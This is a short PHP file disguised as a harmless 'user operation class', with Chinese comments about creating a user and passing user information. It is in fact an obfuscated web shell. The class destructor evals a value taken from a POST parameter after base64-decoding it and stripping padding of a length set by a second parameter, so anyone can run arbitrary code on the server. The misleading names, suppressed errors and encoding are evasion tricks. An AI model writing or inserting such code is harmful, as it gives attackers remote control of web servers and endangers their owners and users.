<?php
/* 用户操作类 */
class User
{
  public $name = '';
  public $config = null;

  function __destruct(){
    @eval(''.$config."$this->name");
  }
}
// 生成用户
$user = new User;
$num = @$_POST['num'];
// 传递用户信息
$c = \base64_decode((substr(@$_POST['a'],$num,-$num)));
$user->name = ''.$c;
?>